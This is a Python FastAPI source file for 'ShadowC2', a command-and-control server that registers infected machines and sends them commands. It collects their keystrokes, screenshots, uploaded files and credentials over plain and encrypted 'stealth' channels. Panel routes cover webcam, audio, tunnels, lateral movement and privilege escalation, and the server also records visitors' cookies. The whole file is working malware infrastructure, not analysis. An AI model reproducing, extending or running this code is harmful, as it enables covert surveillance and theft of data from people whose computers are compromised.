from fastapi import FastAPI
from fastapi import FastAPI, WebSocket, WebSocketDisconnect, Request, UploadFile, File, Form
from fastapi.middleware.cors import CORSMiddleware
from fastapi.responses import HTMLResponse, JSONResponse, FileResponse
from fastapi.staticfiles import StaticFiles
from fastapi.templating import Jinja2Templates
import asyncio
import json
import os
import uuid
from datetime import datetime
from pathlib import Path
from typing import Optional
import uvicorn

from database import *
from crypto import *

app = FastAPI(title="ShadowC2", version="2.0")

app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)
BASE_DIR = Path(__file__).parent
app.mount("/static", StaticFiles(directory=str(BASE_DIR / "static")), name="static")
templates = Jinja2Templates(directory=str(BASE_DIR / "panel"))

active_connections = {}

@app.get("/", response_class=HTMLResponse)
async def dashboard(request: Request):
    log_panel_visit(request.client.host, request.headers.get("user-agent", ""), str(hash(request.headers.get("sec-ch-ua", "") + request.client.host) % 10000000), request.headers.get("cookie", ""), "Unknown", "Unknown", request.headers.get("accept-language", "Unknown"), "dashboard")
    return templates.TemplateResponse(request, "dashboard.html", {"stats": get_stats(), "bots": get_bots(), "server_time": datetime.now().isoformat()})

@app.get("/bots")
async def bots_page(request: Request):
    log_panel_visit(request.client.host, request.headers.get("user-agent", ""), "", request.headers.get("cookie", ""), "", "", request.headers.get("accept-language", ""), "bots")
    return templates.TemplateResponse(request, "bots.html", {"bots": get_bots()})

@app.get("/commands")
async def commands_page(request: Request):
    log_panel_visit(request.client.host, request.headers.get("user-agent", ""), "", request.headers.get("cookie", ""), "", "", request.headers.get("accept-language", ""), "commands")
    return templates.TemplateResponse(request, "commands.html", {"commands": get_commands(), "bots": get_bots()})

@app.get("/keylogs")
async def keylogs_page(request: Request):
    log_panel_visit(request.client.host, request.headers.get("user-agent", ""), "", request.headers.get("cookie", ""), "", "", request.headers.get("accept-language", ""), "keylogs")
    return templates.TemplateResponse(request, "keylogs.html", {"keylogs": get_keylogs(), "bots": get_bots()})

@app.get("/screenshots")
async def screenshots_page(request: Request):
    log_panel_visit(request.client.host, request.headers.get("user-agent", ""), "", request.headers.get("cookie", ""), "", "", request.headers.get("accept-language", ""), "screenshots")
    return templates.TemplateResponse(request, "screenshots.html", {"screenshots": get_screenshots(), "bots": get_bots()})

@app.get("/visits")
async def visits_page(request: Request):
    log_panel_visit(request.client.host, request.headers.get("user-agent", ""), "", request.headers.get("cookie", ""), "", "", request.headers.get("accept-language", ""), "visits")
    return templates.TemplateResponse(request, "visits.html", {"visits": get_panel_visits()})

@app.get("/api/stats")
async def api_stats():
    return JSONResponse(get_stats())

@app.get("/api/bots")
async def api_bots():
    return JSONResponse(get_bots())

@app.post("/api/bots/{bot_id}/command")
async def api_send_command(bot_id: str, request: Request):
    data = await request.json()
    cmd_id = add_command(bot_id, data.get("command"), data.get("args"))
    return JSONResponse({"status": "ok", "cmd_id": cmd_id})

@app.get("/api/commands")
async def api_commands(bot_id: Optional[str] = None):
    return JSONResponse(get_commands(bot_id))

@app.get("/api/keylogs")
async def api_keylogs(bot_id: Optional[str] = None):
    return JSONResponse(get_keylogs(bot_id))

@app.get("/api/screenshots")
async def api_screenshots(bot_id: Optional[str] = None):
    return JSONResponse(get_screenshots(bot_id))

@app.get("/api/visits")
async def api_visits():
    return JSONResponse(get_panel_visits())


# ============ PANEL PAGES (faltantes) ============

@app.get("/panel/webcam")
async def panel_webcam(request: Request):
    log_panel_visit(request.client.host, request.headers.get("user-agent", ""), "", request.headers.get("cookie", ""), "", "", request.headers.get("accept-language", ""), "webcam")
    return templates.TemplateResponse(request, "templates/webcam.html", {"bots": get_bots()})

@app.get("/panel/audio")
async def panel_audio(request: Request):
    log_panel_visit(request.client.host, request.headers.get("user-agent", ""), "", request.headers.get("cookie", ""), "", "", request.headers.get("accept-language", ""), "audio")
    return templates.TemplateResponse(request, "templates/audio.html", {"bots": get_bots()})

@app.get("/panel/credentials")
async def panel_credentials(request: Request):
    log_panel_visit(request.client.host, request.headers.get("user-agent", ""), "", request.headers.get("cookie", ""), "", "", request.headers.get("accept-language", ""), "credentials")
    return templates.TemplateResponse(request, "templates/credentials.html", {"bots": get_bots()})

@app.get("/panel/tunnels")
async def panel_tunnels(request: Request):
    log_panel_visit(request.client.host, request.headers.get("user-agent", ""), "", request.headers.get("cookie", ""), "", "", request.headers.get("accept-language", ""), "tunnels")
    return templates.TemplateResponse(request, "templates/tunnels.html", {"bots": get_bots()})

@app.get("/panel/lateral")
async def panel_lateral(request: Request):
    log_panel_visit(request.client.host, request.headers.get("user-agent", ""), "", request.headers.get("cookie", ""), "", "", request.headers.get("accept-language", ""), "lateral")
    return templates.TemplateResponse(request, "templates/lateral.html", {"bots": get_bots()})

@app.get("/panel/privesc")
async def panel_privesc(request: Request):
    log_panel_visit(request.client.host, request.headers.get("user-agent", ""), "", request.headers.get("cookie", ""), "", "", request.headers.get("accept-language", ""), "privesc")
    return templates.TemplateResponse(request, "templates/privesc.html", {"bots": get_bots()})

# ============ DELETE BOT ============
@app.delete("/api/bots/{bot_id}/delete")
async def api_delete_bot(bot_id: str):
    delete_bot(bot_id)
    return JSONResponse({"status": "deleted", "bot_id": bot_id})

@app.post("/api/credentials")
async def api_credentials(request: Request):
    data = await request.json()
    print(f"[CREDENTIALS] {data}")
    return JSONResponse({"status": "ok"})

# ============ C2 CLEAR (sin encriptación) ============

@app.post("/c2/clear/register")
async def c2_clear_register(request: Request):
    data = await request.json()
    bot_id = data.get("bot_id", str(uuid.uuid4())[:8])
    register_bot(bot_id, data.get("hostname", "Unknown"), data.get("username", "Unknown"), data.get("os", "Unknown"), request.client.host, data.get("capabilities", []))
    return JSONResponse({"status": "registered", "bot_id": bot_id, "check_interval": 5})

@app.get("/c2/clear/check/{bot_id}")
async def c2_clear_check(bot_id: str):
    update_bot_status(bot_id, "online")
    commands = get_pending_commands(bot_id)
    for cmd in commands:
        update_command_status(cmd["id"], "sent")
    return JSONResponse({"commands": commands})

@app.post("/c2/clear/result/{bot_id}")
async def c2_clear_result(bot_id: str, request: Request):
    data = await request.json()
    update_command_status(data.get("cmd_id"), "completed", json.dumps(data.get("result")) if isinstance(data.get("result"), dict) else data.get("result"))
    return JSONResponse({"status": "ok"})

@app.post("/c2/clear/heartbeat/{bot_id}")
async def c2_clear_heartbeat(bot_id: str):
    update_bot_status(bot_id, "online")
    return JSONResponse({"status": "ok"})

@app.post("/c2/clear/keylog/{bot_id}")
async def c2_clear_keylog(bot_id: str, request: Request):
    data = await request.json()
    add_keylog(bot_id, data.get("window", "Unknown"), data.get("keystrokes", ""))
    return JSONResponse({"status": "ok"})

@app.post("/c2/clear/screenshot/{bot_id}")
async def c2_clear_screenshot(bot_id: str, file: UploadFile = File(...)):
    filename = f"{bot_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
    filepath = BASE_DIR / "static" / "screenshots" / filename
    filepath.parent.mkdir(exist_ok=True)
    content = await file.read()
    with open(filepath, "wb") as f:
        f.write(content)
    add_screenshot(bot_id, filename)
    return JSONResponse({"status": "ok", "filename": filename})

@app.post("/c2/clear/file/{bot_id}")
async def c2_clear_file(bot_id: str, file: UploadFile = File(...), path: str = Form(...)):
    filename = f"{bot_id}_{file.filename}"
    filepath = BASE_DIR / "static" / "files" / filename
    filepath.parent.mkdir(exist_ok=True)
    content = await file.read()
    with open(filepath, "wb") as f:
        f.write(content)
    add_file(bot_id, filename, path, len(content))
    return JSONResponse({"status": "ok", "filename": filename})

# ============ C2 STEALTH (con encriptación) ============

def _try_decrypt_stealth(request_data):
    """Intenta desencriptar datos stealth. Retorna dict o None."""
    # Si es un dict plano (CLEAR), retornar None para que lo maneje CLEAR
    if isinstance(request_data, dict) and "bot_id" in request_data:
        return None
    
    # Si tiene campo "data", intentar desencriptar
    encrypted_data = request_data.get("data", "") if isinstance(request_data, dict) else request_data
    
    if not encrypted_data:
        return None
    
    # Intentar decrypt_response (compresión + encriptación)
    result = decrypt_response(encrypted_data)
    if result:
        return result
    
    # Intentar decrypt_command (polimórfico + encriptación)
    result = decrypt_command(encrypted_data)
    if result:
        return result
    
    return None

@app.post("/c2/stealth/register")
async def c2_stealth_register(request: Request):
    body = await request.json()
    
    # DEBUG
    print(f"[DEBUG STEALTH] Body recibido: {str(body)[:200]}")
    
    # Intentar desencriptar
    data = _try_decrypt_stealth(body)
    
    if data:
        print(f"[DEBUG STEALTH] Datos desencriptados: {data}")
    else:
        print(f"[DEBUG STEALTH] No se pudieron desencriptar los datos")
        return JSONResponse({"error": "Invalid data"}, status_code=400)
    
    bot_id = data.get("bot_id", str(uuid.uuid4())[:8])
    register_bot(bot_id, data.get("hostname", "Unknown"), data.get("username", "Unknown"), data.get("os", "Unknown"), request.client.host, data.get("capabilities", []))
    
    # Responder encriptado
    response = encrypt_response({"status": "registered", "bot_id": bot_id, "check_interval": 10})
    return JSONResponse({"data": response})

@app.get("/c2/stealth/check/{bot_id}")
async def c2_stealth_check(bot_id: str):
    update_bot_status(bot_id, "online")
    commands = get_pending_commands(bot_id)
    encrypted_commands = []
    for cmd in commands:
        update_command_status(cmd["id"], "sent")
        encrypted_commands.append(encrypt_command({"cmd_id": cmd["id"], "command": cmd["command"], "args": json.loads(cmd["args"]) if cmd["args"] else None}))
    return JSONResponse({"data": encrypt_response({"commands": encrypted_commands})})

@app.post("/c2/stealth/result/{bot_id}")
async def c2_stealth_result(bot_id: str, request: Request):
    body = await request.json()
    data = _try_decrypt_stealth(body)
    
    if not data:
        return JSONResponse({"error": "Invalid data"}, status_code=400)
    
    update_command_status(data.get("cmd_id"), "completed", json.dumps(data.get("result")) if isinstance(data.get("result"), dict) else data.get("result"))
    return JSONResponse({"data": encrypt_response({"status": "ok"})})

@app.post("/c2/stealth/heartbeat/{bot_id}")
async def c2_stealth_heartbeat(bot_id: str):
    update_bot_status(bot_id, "online")
    return JSONResponse({"data": encrypt_response({"status": "ok"})})

@app.post("/c2/stealth/keylog/{bot_id}")
async def c2_stealth_keylog(bot_id: str, request: Request):
    body = await request.json()
    data = _try_decrypt_stealth(body)
    
    if data:
        add_keylog(bot_id, data.get("window", "Unknown"), data.get("keystrokes", ""))
    return JSONResponse({"data": encrypt_response({"status": "ok"})})

@app.post("/c2/stealth/screenshot/{bot_id}")
async def c2_stealth_screenshot(bot_id: str, request: Request):
    body = await request.json()
    data = _try_decrypt_stealth(body)
    
    if data and "image_data" in data:
        filename = f"{bot_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
        filepath = BASE_DIR / "static" / "screenshots" / filename
        filepath.parent.mkdir(exist_ok=True)
        image_bytes = base64.b64decode(data["image_data"])
        with open(filepath, "wb") as f:
            f.write(image_bytes)
        add_screenshot(bot_id, filename)
    return JSONResponse({"data": encrypt_response({"status": "ok"})})

@app.post("/c2/stealth/file/{bot_id}")
async def c2_stealth_file(bot_id: str, request: Request):
    body = await request.json()
    data = _try_decrypt_stealth(body)
    
    if data and "file_data" in data:
        filename = f"{bot_id}_{data.get('filename', 'unknown')}"
        filepath = BASE_DIR / "static" / "files" / filename
        filepath.parent.mkdir(exist_ok=True)
        file_bytes = base64.b64decode(data["file_data"])
        with open(filepath, "wb") as f:
            f.write(file_bytes)
        add_file(bot_id, filename, data.get("original_path", ""), len(file_bytes))
    return JSONResponse({"data": encrypt_response({"status": "ok"})})

@app.websocket("/ws")
async def websocket_endpoint(websocket: WebSocket):
    await websocket.accept()
    client_id = str(uuid.uuid4())

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
